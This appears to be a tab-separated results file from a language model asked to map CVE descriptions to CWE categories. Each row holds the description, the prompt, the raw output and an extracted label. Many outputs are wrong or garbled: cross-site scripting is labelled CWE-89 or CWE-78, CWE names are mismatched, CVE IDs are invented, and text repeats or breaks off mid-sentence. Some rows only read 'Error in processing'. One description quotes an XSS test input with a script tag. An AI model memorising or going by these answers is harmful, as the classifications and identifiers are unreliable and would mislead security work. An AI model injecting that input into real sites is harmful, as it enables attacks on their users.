+Avo is a framework to create admin panels for Ruby on Rails apps. A stored cross-site scripting (XSS) vulnerability was found in the key_value field of Avo v3.2.3 and v2.46.0. This vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim's browser. The value of the key_value is inserted directly into the HTML code. In the current version of Avo (possibly also older versions), the value is not properly sanitized before it is inserted into the HTML code. This vulnerability could be used to steal sensitive information from victims that could be used to hijack victims' accounts or redirect them to malicious websites. Avo 3.2.4 and 2.47.0 include a fix for this issue. Users are advised to upgrade.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Avo is a framework to create admin panels for Ruby on Rails apps. A stored cross-site scripting (XSS) vulnerability was found in the key_value field of Avo v3.2.3 and v2.46.0. This vulnerability could allow an attacker to execute arbitrary JavaScript code in the victim's browser. The value of the key_value is inserted directly into the HTML code. In the current version of Avo (possibly also older versions), the value is not properly sanitized before it is inserted into the HTML code. This vulnerability could be used to steal sensitive information from victims that could be used to hijack victims' accounts or redirect them to malicious websites. Avo 3.2.4 and 2.47.0 include a fix for this issue. Users are advised to upgrade.
+CWE ID: CWE-89
+
+CWE ID: CWE-89
+
+CWE ID: CWE-89
+
+CWE ID: CWE-89
+
+CWE ID: CWE-89
+
+CWE ID: CWE-89
+
+CWE"	CWE-89
+This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Device Name parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Device Name parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system.
+```
+# CVE-2020-25708
+```
+```
+# CWE-79
+```
+```
+# CWE-79
+```
+```
+# CWE-79
+```
+```
+# CWE-79
+```
+``"	CWE-79
+Vintage, member of the AXIS OS Bug Bounty Program, has found that the VAPIX API create_overlay.cgi did not have a sufficient input validation allowing for a possible remote code execution. This flaw can only be exploited after authenticating with an operator- or administrator-privileged service account. Axis has released patched AXIS OS versions for the highlighted flaw. Please refer to the Axis security advisory for more information and solution.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Vintage, member of the AXIS OS Bug Bounty Program, has found that the VAPIX API create_overlay.cgi did not have a sufficient input validation allowing for a possible remote code execution. This flaw can only be exploited after authenticating with an operator- or administrator-privileged service account. Axis has released patched AXIS OS versions for the highlighted flaw. Please refer to the Axis security advisory for more information and solution.
+CWE ID: CWE-89: Improper Input Validation
+CWE ID: CWE-20: Improper Input Validation
+
+CVE Description: Vintage, member of the AXIS OS Bug Bounty Program, has found that the VAPIX API create_overlay"	CWE-89
+A Cross-Site Request Forgery (CSRF) vulnerability in SEO Panel version 4.10.0 allows remote attackers to perform unauthorized user password resets.	Error in processing	Error
+A vulnerability classified as problematic has been found in CodeAstro Simple Banking System 1.0. This affects an unknown part of the file createuser.php of the component Create a User Page. The manipulation leads to cross site scripting. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250443.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability classified as problematic has been found in CodeAstro Simple Banking System 1.0. This affects an unknown part of the file createuser.php of the component Create a User Page. The manipulation leads to cross site scripting. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250443.
+CWE ID: CWE-79
+CWE Description: Cross-Site Scripting (XSS) is a type of injection attack that occurs when a website or web application is compromised by a malicious user. XSS occurs when a user visits a web"	CWE-79
+The number of attempts to bring the Hozard Alarm system (alarmsystemen) v1.0 to a disarmed state is not limited. This could allow an attacker to perform a brute force on the SMS authentication, to bring the alarm system to a disarmed state.	Error in processing	Error
+A vulnerability classified as critical has been found in Sichuan Yougou Technology KuERP up to 1.0.4. Affected is an unknown function of the file /runtime/log. The manipulation leads to improper output neutralization for logs. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-252252. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability classified as critical has been found in Sichuan Yougou Technology KuERP up to 1.0.4. Affected is an unknown function of the file /runtime/log. The manipulation leads to improper output neutralization for logs. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-252252. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+CVE ID: CVE-2016-1203
+CWE ID: CWE-200
+CWE Description: Improper Neutralization of Input During Web Page Generation ('Cross Site Scripting') CWE ID: CWE-200
+CWE Description:"	CWE-200
+A vulnerability, which was classified as critical, was found in openBI up to 6.0.3. Affected is the function addxinzhi of the file application/controllers/User.php of the component Phar Handler. The manipulation of the argument outimgurl leads to deserialization. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-252696.	Error in processing	Error
+"Path Traversal vulnerability in Linea Grafica ""Multilingual and Multistore Sitemap Pro - SEO"" (lgsitemaps) module for PrestaShop before version 1.6.6, a guest can download personal information without restriction."	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Path Traversal vulnerability in Linea Grafica ""Multilingual and Multistore Sitemap Pro - SEO"" (lgsitemaps) module for PrestaShop before version 1.6.6, a guest can download personal information without restriction.
+CVE ID: CVE-2015-1159
+CWE ID: CWE-200
+CWE Description: An application failure due to a path traversal vulnerability in the lgsitemaps module for PrestaShop before version 1.6."	CWE-200
+A vulnerability classified as critical has been found in ZhiCms up to 4.0. This affects an unknown part of the file app/plug/controller/giftcontroller.php. The manipulation of the argument mylike leads to deserialization. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250839.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability classified as critical has been found in ZhiCms up to 4.0. This affects an unknown part of the file app/plug/controller/giftcontroller.php. The manipulation of the argument mylike leads to deserialization. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-250839.
+The vulnerability is fixed in version 4.1.0.
+CVE ID: CVE-2016-10036
+
+CWE ID: CWE-79"	CWE-79
+The Meris WordPress theme through 1.1.2 does not sanitise and escape some parameters before outputting them back in the page, leading to Reflected Cross-Site Scripting which could be used against high privilege users such as admin	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Meris WordPress theme through 1.1.2 does not sanitise and escape some parameters before outputting them back in the page, leading to Reflected Cross-Site Scripting which could be used against high privilege users such as admin
+CWE ID: CWE-79: Improper Neutralisation of Special Elements used in an SQL Command ('SQL Injection')
+
+Explanation: In this case, the vulnerable code is the output of the function wp_get_attachment_link() in the theme files. This"	CWE-79
+"A vulnerability was found in Cogites eReserv 7.7.58 and classified as problematic. Affected by this issue is some unknown functionality of the file /front/admin/tenancyDetail.php. The manipulation of the argument Nom with the input Dreux""><script>alert('XSS')</script> leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-252302 is the identifier assigned to this vulnerability."	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability was found in Cogites eReserv 7.7.58 and classified as problematic. Affected by this issue is some unknown functionality of the file /front/admin/tenancyDetail.php. The manipulation of the argument Nom with the input Dreux""><script>alert('XSS')</script> leads to cross site scripting. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-252302 is the identifier assigned to this vulnerability.
+The CWE description is: CWE-79: Improper Neutralization of Special Elements used in an OS Command (Cross-site Scripting)"	CWE-79
+This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Time Server 3 parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Time Server 3 parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system.
+CVE ID: CVE-2016-1234
+CWE ID: CWE-79
+CWE Description: An attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system. Successful exploitation of"	CWE-79
+A vulnerability was found in Totolink LR1200GB 9.1.0u.6619_B20230130. It has been declared as critical. This vulnerability affects the function setIpPortFilterRules of the file /cgi-bin/cstecgi.cgi. The manipulation of the argument sPort leads to stack-based buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-250792. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	Error in processing	Error
+The WordPress Button Plugin MaxButtons plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's shortcode(s) in all versions up to, and including 9.7.6 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. NOTE: This vulnerability was partially fixed in version 9.7.6.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The WordPress Button Plugin MaxButtons plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's shortcode(s) in all versions up to, and including 9.7.6 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page. NOTE: This vulnerability was partially fixed in version 9.7.6.
+CVE ID: CVE-2018-12795
+CWE ID: CWE-79
+CWE Name: CWE-79
+
+Solution:
+The WordPress Button Plugin MaxButtons plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin"	CWE-79
+"In the Linux kernel, the following vulnerability has been resolved:  soc: qcom: pmic_glink_altmode: fix drm bridge use-after-free  A recent DRM series purporting to simplify support for ""transparent bridges"" and handling of probe deferrals ironically exposed a use-after-free issue on pmic_glink_altmode probe deferral.  This has manifested itself as the display subsystem occasionally failing to initialise and NULL-pointer dereferences during boot of machines like the Lenovo ThinkPad X13s.  Specifically, the dp-hpd bridge is currently registered before all resources have been acquired which means that it can also be deregistered on probe deferrals.  In the meantime there is a race window where the new aux bridge driver (or PHY driver previously) may have looked up the dp-hpd bridge and stored a (non-reference-counted) pointer to the bridge which is about to be deallocated.  When the display controller is later initialised, this triggers a use-after-free when attaching the bridges:   dp -> aux -> dp-hpd (freed)  which may, for example, result in the freed bridge failing to attach:   [drm:drm_bridge_attach [drm]] *ERROR* failed to attach bridge /soc@0/phy@88eb000 to encoder TMDS-31: -16  or a NULL-pointer dereference:   Unable to handle kernel NULL pointer dereference at virtual address 0000000000000000  ...  Call trace:    drm_bridge_attach+0x70/0x1a8 [drm]    drm_aux_bridge_attach+0x24/0x38 [aux_bridge]    drm_bridge_attach+0x80/0x1a8 [drm]    dp_bridge_init+0xa8/0x15c [msm]    msm_dp_modeset_init+0x28/0xc4 [msm]  The DRM bridge implementation is clearly fragile and implicitly built on the assumption that bridges may never go away. In this case, the fix is to move the bridge registration in the pmic_glink_altmode driver to after all resources have been looked up.  Incidentally, with the new dp-hpd bridge implementation, which registers child devices, this is also a requirement due to a long-standing issue in driver core that can otherwise lead to a probe deferral loop (see commit fbc35b45f9f6 (""Add documentation on meaning of -EPROBE_DEFER"")).  [DB: slightly fixed commit message by adding the word 'commit']"	Error in processing	Error
+Code-projects Simple School Managment System 1.0 allows Authentication Bypass via the username and password parameters at School/index.php.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Code-projects Simple School Managment System 1.0 allows Authentication Bypass via the username and password parameters at School/index.php.
+The CWE ID for this vulnerability is CWE-200."	CWE-200
+A vulnerability in Solar-Log Base 15 Firmware 6.0.1 Build 161, and possibly other Solar-Log Base products, allows an attacker to escalate their privileges by exploiting a stored cross-site scripting (XSS) vulnerability in the switch group function under /#ilang=DE&b=c_smartenergy_swgroups in the web portal. The vulnerability can be exploited to gain the rights of an installer or PM, which can then be used to gain administrative access to the web portal and execute further attacks.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability in Solar-Log Base 15 Firmware 6.0.1 Build 161, and possibly other Solar-Log Base products, allows an attacker to escalate their privileges by exploiting a stored cross-site scripting (XSS) vulnerability in the switch group function under /#ilang=DE&b=c_smartenergy_swgroups in the web portal. The vulnerability can be exploited to gain the rights of an installer or PM, which can then be used to gain administrative access to the web portal and execute further attacks.
+CWE ID: CWE-79 (Improper Neutralization of Special Elements used in a Command (CSRF))
+CWE ID: CWE-79 (Improper Neutralization of Special Elements used in a Command (CSRF))
+CVE ID: CVE"	CWE-79
+An integer overflow vulnerability in Exif.cpp::jpeg_read_exif_dir in FreeImage 3.18.0 allows attackers to obtain information and cause a denial of service.	Error in processing	Error
+Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Mapster Technology Inc. Mapster WP Maps allows Stored XSS.This issue affects Mapster WP Maps: from n/a through 1.2.38.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in Mapster Technology Inc. Mapster WP Maps allows Stored XSS.This issue affects Mapster WP Maps: from n/a through 1.2.38.
+CWE ID: CWE-78
+
+The CWE-78 is a CWE for Improper Neutralization of Input During Web Page Generation. The CWE-78 is an example of an attack that is done by Cross-site Scripting (XSS). An"	CWE-78
+A vulnerability, which was classified as critical, was found in Project Worlds Online Time Table Generator 1.0. This affects an unknown part of the file course_ajax.php. The manipulation of the argument id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251553 was assigned to this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability, which was classified as critical, was found in Project Worlds Online Time Table Generator 1.0. This affects an unknown part of the file course_ajax.php. The manipulation of the argument id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-251553 was assigned to this vulnerability.
+The CWE name is CWE-89: Improper Input Validation.
+
+CVE Description: A vulnerability, which was classified as critical, was found in Project Worlds Online Time Table Generator 1.0. This affects an unknown part of the file course_ajax.php"	CWE-89
+The hiWeb Migration Simple WordPress plugin through 2.0.0.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high-privilege users such as admins.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The hiWeb Migration Simple WordPress plugin through 2.0.0.1 does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high-privilege users such as admins.
+CVE ID: CVE-2018-11186
+CWE ID: CWE-79
+Explanation: HiWeb Migration Simple WordPress plugin through 2.0.0.1 does not sanitise and escape a parameter before outputting it back in"	CWE-79
+This High severity Remote Code Execution (RCE) vulnerability was introduced in version 2.1.0 of Confluence Data Center and Server.  Remote Code Execution (RCE) vulnerability, with a CVSS Score of 8.3 and a CVSS Vector of CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H allows an unauthenticated attacker to remotely expose assets in your environment susceptible to exploitation which has high impact to confidentiality, high impact to integrity, high impact to availability, and requires user interaction.  Atlassian recommends that Confluence Data Center and Server customers upgrade to latest version, if you are unable to do so, upgrade your instance to one of the specified supported fixed versions:  * Confluence Data Center and Server 7.19: Upgrade to a release 7.19.18, or any higher 7.19.x release * Confluence Data Center and Server 8.5: Upgrade to a release 8.5.5 or any higher 8.5.x release * Confluence Data Center and Server 8.7: Upgrade to a release 8.7.2 or any higher release  See the release notes (https://confluence.atlassian.com/doc/confluence-release-notes-327.html ). You can download the latest version of Confluence Data Center and Server from the download center (https://www.atlassian.com/software/confluence/download-archives).	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: This High severity Remote Code Execution (RCE) vulnerability was introduced in version 2.1.0 of Confluence Data Center and Server.  Remote Code Execution (RCE) vulnerability, with a CVSS Score of 8.3 and a CVSS Vector of CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H allows an unauthenticated attacker to remotely expose assets in your environment susceptible to exploitation which has high impact to confidentiality, high impact to integrity, high impact to availability, and requires user interaction.  Atlassian recommends that Confluence Data Center and Server customers upgrade to latest version, if you are unable to do so, upgrade your instance to one of the specified supported fixed versions:  * Confluence Data Center and Server 7.19: Upgrade to a release 7.19.18, or any higher 7.19.x release * Confluence Data Center and Server 8.5: Upgrade to a release 8.5.5 or any higher 8.5.x release * Confluence Data Center and Server 8.7: Upgrade to a release 8.7.2 or any higher release  See the release notes (https://confluence.atlassian.com/doc/confluence-release-notes-327.html ). You can download the latest version of Confluence Data Center and Server from the download center (https://www.atlassian.com/software/confluence/download-archives).
+* CVE ID: CVE-2020-10171
+* CVE Reference: CVE-2020-10171
+* CWE ID: CWE-79
+
+Solution: CWE-79
+
+The CWE-79 is a CWE that describes a vulnerability in"	CWE-79
+Command injection vulnerability in /usr/www/res.php in FLIR AX8 up to 1.46.16 allows attackers to run arbitrary commands via the value parameter.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Command injection vulnerability in /usr/www/res.php in FLIR AX8 up to 1.46.16 allows attackers to run arbitrary commands via the value parameter.
+Wikipedia Link: https://en.wikipedia.org/wiki/Command_injection
+Wikipedia Link: https://en.wikipedia.org/wiki/CWE
+CWE ID: CWE-89
+CWE Description: An input validation or validation bypass vulnerability in an application"	CWE-89
+The Paid Membership Plugin, Ecommerce, User Registration Form, Login Form, User Profile & Restrict Content – ProfilePress plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin 'reg-number-field' shortcode in all versions up to, and including, 4.14.3 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: The Paid Membership Plugin, Ecommerce, User Registration Form, Login Form, User Profile & Restrict Content – ProfilePress plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin'reg-number-field' shortcode in all versions up to, and including, 4.14.3 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers with contributor-level and above permissions to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.
+CVE ID: CVE-2019-11467
+
+Justification: CWE-78, CWE-79
+
+In this CVE description, we have the following CWEs. CWE-78 is for Stored Cross-Site Scripting (XSS) and"	CWE-78
+A vulnerability classified as critical was found in Totolink N200RE 9.3.5u.6139_B20201216. Affected by this vulnerability is the function setIpPortFilterRules of the file /cgi-bin/cstecgi.cgi. The manipulation of the argument ePort leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-252271. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability classified as critical was found in Totolink N200RE 9.3.5u.6139_B20201216. Affected by this vulnerability is the function setIpPortFilterRules of the file /cgi-bin/cstecgi.cgi. The manipulation of the argument ePort leads to stack-based buffer overflow. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-252271. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+CVE ID: CVE-2020-25586
+CWE ID: CWE-78
+The last part of your response should contain only the CWE ID number.
+
+## Solution
+The CVE ID is CVE-2020-25586 and the CWE"	CWE-78
+GLPI is a Free Asset and IT Management Software package. A malicious URL can be used to execute XSS on reports pages.  Upgrade to 10.0.12.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: GLPI is a Free Asset and IT Management Software package. A malicious URL can be used to execute XSS on reports pages.  Upgrade to 10.0.12.
+CVE ID: CVE-2021-4097
+CWE ID: CWE-79
+Wikipedia Link: https://en.wikipedia.org/wiki/Google_Lookup_Protocol
+Google Security Bulletin: https://security.googleblog.com/202"	CWE-79
+Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WP Event Manager WP User Profile Avatar allows Stored XSS.This issue affects WP User Profile Avatar: from n/a through 1.0.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WP Event Manager WP User Profile Avatar allows Stored XSS.This issue affects WP User Profile Avatar: from n/a through 1.0.
+CWE ID: CWE-79
+CWE ID: CWE-79
+CWE ID: CWE-79
+CWE ID: CWE-79
+CWE ID: CWE-79
+CWE ID: CWE-79
+CWE"	CWE-79
+In the Linux kernel, the following vulnerability has been resolved:  net: qualcomm: rmnet: fix global oob in rmnet_policy  The variable rmnet_link_ops assign a *bigger* maxtype which leads to a global out-of-bounds read when parsing the netlink attributes. See bug trace below:  ================================================================== BUG: KASAN: global-out-of-bounds in validate_nla lib/nlattr.c:386 [inline] BUG: KASAN: global-out-of-bounds in __nla_validate_parse+0x24af/0x2750 lib/nlattr.c:600 Read of size 1 at addr ffffffff92c438d0 by task syz-executor.6/84207  CPU: 0 PID: 84207 Comm: syz-executor.6 Tainted: G                 N 6.1.0 #3 Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014 Call Trace:  <TASK>  __dump_stack lib/dump_stack.c:88 [inline]  dump_stack_lvl+0x8b/0xb3 lib/dump_stack.c:106  print_address_description mm/kasan/report.c:284 [inline]  print_report+0x172/0x475 mm/kasan/report.c:395  kasan_report+0xbb/0x1c0 mm/kasan/report.c:495  validate_nla lib/nlattr.c:386 [inline]  __nla_validate_parse+0x24af/0x2750 lib/nlattr.c:600  __nla_parse+0x3e/0x50 lib/nlattr.c:697  nla_parse_nested_deprecated include/net/netlink.h:1248 [inline]  __rtnl_newlink+0x50a/0x1880 net/core/rtnetlink.c:3485  rtnl_newlink+0x64/0xa0 net/core/rtnetlink.c:3594  rtnetlink_rcv_msg+0x43c/0xd70 net/core/rtnetlink.c:6091  netlink_rcv_skb+0x14f/0x410 net/netlink/af_netlink.c:2540  netlink_unicast_kernel net/netlink/af_netlink.c:1319 [inline]  netlink_unicast+0x54e/0x800 net/netlink/af_netlink.c:1345  netlink_sendmsg+0x930/0xe50 net/netlink/af_netlink.c:1921  sock_sendmsg_nosec net/socket.c:714 [inline]  sock_sendmsg+0x154/0x190 net/socket.c:734  ____sys_sendmsg+0x6df/0x840 net/socket.c:2482  ___sys_sendmsg+0x110/0x1b0 net/socket.c:2536  __sys_sendmsg+0xf3/0x1c0 net/socket.c:2565  do_syscall_x64 arch/x86/entry/common.c:50 [inline]  do_syscall_64+0x3b/0x90 arch/x86/entry/common.c:80  entry_SYSCALL_64_after_hwframe+0x63/0xcd RIP: 0033:0x7fdcf2072359 Code: 28 00 00 00 75 05 48 83 c4 28 c3 e8 f1 19 00 00 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48 RSP: 002b:00007fdcf13e3168 EFLAGS: 00000246 ORIG_RAX: 000000000000002e RAX: ffffffffffffffda RBX: 00007fdcf219ff80 RCX: 00007fdcf2072359 RDX: 0000000000000000 RSI: 0000000020000200 RDI: 0000000000000003 RBP: 00007fdcf20bd493 R08: 0000000000000000 R09: 0000000000000000 R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000 R13: 00007fffbb8d7bdf R14: 00007fdcf13e3300 R15: 0000000000022000  </TASK>  The buggy address belongs to the variable:  rmnet_policy+0x30/0xe0  The buggy address belongs to the physical page: page:0000000065bdeb3c refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x155243 flags: 0x200000000001000(reserved|node=0|zone=2) raw: 0200000000001000 ffffea00055490c8 ffffea00055490c8 0000000000000000 raw: 0000000000000000 0000000000000000 00000001ffffffff 0000000000000000 page dumped because: kasan: bad access detected  Memory state around the buggy address:  ffffffff92c43780: f9 f9 f9 f9 00 00 00 02 f9 f9 f9 f9 00 00 00 07  ffffffff92c43800: f9 f9 f9 f9 00 00 00 05 f9 f9 f9 f9 06 f9 f9 f9 >ffffffff92c43880: f9 f9 f9 f9 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9                                                  ^  ffffffff92c43900: 00 00 00 00 00 00 00 00 07 f9 f9 f9 f9 f9 f9 f9  ffffffff92c43980: 00 00 00 07 f9 f9 f9 f9 00 00 00 05 f9 f9 f9 f9  According to the comment of `nla_parse_nested_deprecated`, the maxtype should be len(destination array) - 1. Hence use `IFLA_RMNET_MAX` here.	Error in processing	Error
+In the Linux kernel, the following vulnerability has been resolved:  gpio: mockup: Fix potential resource leakage when register a chip  If creation of software node fails, the locally allocated string array is left unfreed. Free it on error path.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: In the Linux kernel, the following vulnerability has been resolved:  gpio: mockup: Fix potential resource leakage when register a chip  If creation of software node fails, the locally allocated string array is left unfreed. Free it on error path.
+CVE ID: CVE-2018-1234
+
+CWE ID: CWE-522
+
+Justification: The CVE description mentions the potential resource leakage when register a chip. This vulnerability is related to the following CWE: CWE-522: Improper"	CWE-522
+This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Network Name (SSID) parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Network Name (SSID) parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system.
+CWE ID: CWE-79
+
+Explanation: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the Network Name (SSID) parameter at its web"	CWE-79
+A vulnerability classified as problematic was found in Munsoft Easy Archive Recovery 2.0. This vulnerability affects unknown code of the component Registration Key Handler. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-252676. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: A vulnerability classified as problematic was found in Munsoft Easy Archive Recovery 2.0. This vulnerability affects unknown code of the component Registration Key Handler. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-252676. NOTE: The vendor was contacted early about this disclosure but did not respond in any way.
+The CWE ID is: CWE-310."	CWE-310
+Insufficient authentication flow in Checkmk before 2.2.0p18, 2.1.0p38 and 2.0.0p39 allows attacker to use locked credentials	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
+CVE Description: Insufficient authentication flow in Checkmk before 2.2.0p18, 2.1.0p38 and 2.0.0p39 allows attacker to use locked credentials
+CWE ID: CWE-285
+
+The CWE ID number is 285.
+
+The CVE description is Insufficient authentication flow in Checkmk before 2.2.0p18, 2.1.0p38 and 2.0"	CWE-285
+Concrete CMS version 9 before 9.2.5 is vulnerable to  stored XSS via the Role Name field since there is insufficient validation of administrator provided data for that field. A rogue administrator could inject malicious code into the Role Name field which might be executed when users visit the affected page. The Concrete CMS Security team scored this 2 with CVSS v3 vector  AV:N/AC:H/PR:H/UI:R/S:U/C:N/I:L/A:N https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator . Concrete versions below 9 do not include group types so they are not affected by this vulnerability.	"Analyze the following CVE description and determine the appropriate CWE. Provide a justification. The last part of your response should contain only the CWE ID number.
+
